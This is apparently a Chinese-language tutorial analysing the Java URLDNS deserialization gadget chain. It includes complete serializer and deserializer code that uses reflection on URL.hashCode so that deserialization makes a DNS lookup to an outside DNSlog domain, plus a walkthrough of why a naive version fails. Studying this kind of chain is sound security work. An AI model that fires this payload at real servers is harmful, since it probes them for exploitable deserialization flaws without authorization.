主要是由于使用的入口类（这里指的是HashMap）中重写了readObject方法，该方法中为了保证值的唯一性调用了hashCode函数计算Hash值，经过一系列调用产生了JAVA反序列化漏洞

# 作用

这条链主要是能在服务器调用readObject方法反序列化我们的内容时，会向我们写的URL发送请求，从而确定是否有反序列化漏洞

# 复现条件

序列化类(SerializeTest.java) 反序列化类(UnserializeTest.java) 模拟两个类在两台电脑上进行通信

```java
jipackage Serialize;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class SerializeTest {

    public static void serialize(Object obj) throws IOException, NoSuchFieldException, IllegalAccessException {
        ObjectOutputStream oos =new ObjectOutputStream(new FileOutputStream("person.txt"));
        oos.writeObject(obj);
        System.out.println("反序列化完成");

    }
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException {

        HashMap<URL,Integer> hashmap = new HashMap<>();
        URL url = new URL("http://yprtumfdej.yutu.eu.org");
        Class c = url.getClass();
        Field hashcodefiled = c.getDeclaredField("hashCode");
        hashcodefiled.setAccessible(true);
        hashcodefiled.set(url, 1);
        hashmap.put(url,1);
        hashcodefiled.set(url, -1);

        serialize(hashmap);

    }
```

```java
package Serialize;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.URL;

public class UnserializeTest {
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;

    }

    public static void main(String[] args) throws IOException, ClassNotFoundException {
        unserialize("person.txt");

    }
}
```

# 分析过程

1. 我们需要一个入口类（入口类参数中包含可控类,该类又调用其他有危险方法的类,readObject时调用

比如类型定义为 Object, 调用equals/hashcode/toString 相同类型 同名函数）

2. 想到HashMap类，因为需要保证唯一性，必须重写readObject，并且跟进去发现实现了Serializeable接口，可以进行序列化，适合做入口类

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758177370700-5676d028-d502-4067-b541-7a2741ca5a2f.png)

3. 进入HashMap的readObject方法发现 在最后 它调用hash方法计算了key的hash值，这里的key就是我们传进去的参数

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758177466142-93a23672-f745-4424-94b0-d3653c76f3f7.png)

4. 继续跟进上面的hash方法，发现就是调用我们传入的key自己的hashCode方法

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758177629703-e21ead59-db8a-4326-9558-13d360c696bd.png)

5. 由于我们需要的是向指定url发送请求，有此功能的类是URL类，上面说了，要调用的是传入的key的hashCode方法。跟进URL类，找一下类中是否存在hashCode方法，发现存在，并且他又会调用handler.hashCode方法。

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758198903523-dc22f58d-cb52-4c22-9dcf-9b8862ad3599.png)

6. 继续跟进handler.hashCode方法，这里getHostAddress方法就是根据传入的url

获取IP地址，所以一定存在向url发送请求，于是可以利用DNSlog反弹确定是否存在反序列化漏洞

如果想弄清楚具体实现，也可以继续跟进getHostAddress()

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758199063282-87cc0ac9-5abf-46b9-8145-7a86671885fd.png)

# 整体利用

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758199318171-69e790c5-badb-4add-afe5-c21b601987a2.png)

1. 首先new一个HashMap类，因为通过分析确定了要传入的是URL类，所以泛型这么写，后面的整数，换成什么都可以。
2. new一个URL类，传参直接传入DNSlog生成的url就好，burp，yakit，在线网站均可生成。
3. 得到url的class对象，并反射获取hashCode字段，将它改为1
4. 把URL的实例化对象传入hsahMap，在将hashCode字段改回-1
5. 序列化hashMap
6. 分别执行序列化和反序列化类，DNSlog成功获取目标ip

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758204589370-d4b49c4f-29c1-407b-af32-de8b297653fc.png)

# 关于使用反射改变hashCode的值

初始代码：

```java
jipackage Serialize;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class SerializeTest {

    public static void serialize(Object obj) throws IOException, NoSuchFieldException, IllegalAccessException {
        ObjectOutputStream oos =new ObjectOutputStream(new FileOutputStream("person.txt"));
        oos.writeObject(obj);
        System.out.println("反序列化完成");

    }
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException {

        HashMap<URL,Integer> hashmap = new HashMap<>();
        
        // URL url = new URL("http://yprtumfdej.yutu.eu.org");
        // Class c = url.getClass(); 
        // Field hashcodefiled = c.getDeclaredField("hashCode");
        // hashcodefiled.setAccessible(true);
        // hashcodefiled.set(url, 1);
        // hashmap.put(url,100);
        // hashcodefiled.set(url, -1);
        hashmap.put(new URL("http://yprtumfdej.yutu.eu.org"),100);
        
        serialize(hashmap);

    }
```

1. 这样看起来也可以，因为反序列化时同样会通过hashMap的readObject方法调用URL的hashCode方法最后URL的hsshCode方法调用getHostAddress()，向指定URL发送请求。

2. 我们原本期望的结果是序列化后不会受到DNS记录，服务器反序列化后才收到。

但是实际操作后发现，序列化后我们就收到了，反序列化后反而没有收到。

于是我们查看具体实现方法，跟进HashMap.put方法

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758206687260-ed8b3e7e-f8d3-4ab0-b754-1b01793741d1.png)

4. 由之前的分析，我们希望的链子是调用HashMap.readObject方法时，调用了hash函数，而此时put方法也调用了该函数，那是不是这个的影响，所以这次我们仔细看一下之前出现过的hash方法中的URL.hashCode方法（分析4中说过了，调用hash方法时里面调用了 传入的key 的hashCode方法）

可以看到当hashCode值不为-1时是不会触发后续内容的，而hashCode初始值为-1

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758198903523-dc22f58d-cb52-4c22-9dcf-9b8862ad3599.png?x-oss-process=image%2Fformat%2Cwebp)![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758207100168-6f9749cb-7cc0-4095-9f62-95e0d944c7f9.png "跟进变量hashCode可以看到初始值")

5. 所以问题就出现在put方法，put方法中的hash方法相当于在反序列化前提前触发了后续的链子，提前向URL发送了请求，并且因为return了一个hashCode，让hashCode值不为-1了，所以后续反序列化后也不会触发后续链子，导致利用失败。

# 改进思路

1. 因为put方法提前触发了链子，所以我们希望的是在执行put之前就把hashCode的值改为不是-1，这样put时就不会触发后续的链子，不会发送URL请求。
2. 并且在put之后再把hashCode值改回-1，这样反序列化后又可以触发链子

	这样做就需要用到反射修改成员属性 hashCode